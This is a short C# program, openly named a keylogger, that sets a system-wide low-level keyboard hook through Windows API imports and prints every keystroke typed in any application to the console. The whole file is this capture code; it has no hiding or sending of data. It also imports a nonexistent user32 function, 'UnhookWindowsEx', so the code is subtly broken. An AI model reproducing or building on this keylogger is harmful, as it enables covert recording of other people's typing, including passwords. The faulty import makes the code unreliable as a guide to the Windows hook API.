using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace littlekeylogger
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WH_KEYDOWN = 0x0100;
        private static IntPtr hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static void Main(string[] args)
        {
            hookId = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsEx(hookId);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WH_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.Out.Write((Keys)vkCode);
                if(((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                }else if(((Keys)vkCode).ToString() == "OemComma")
                {
                    Console.Out.Write(",");
                }else if(((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule getModule = currentProcess.MainModule;
            string moduleName = getModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId );

        [DllImport("user32.dll")]
        private static extern IntPtr UnhookWindowsEx(IntPtr hhk);

    }
}
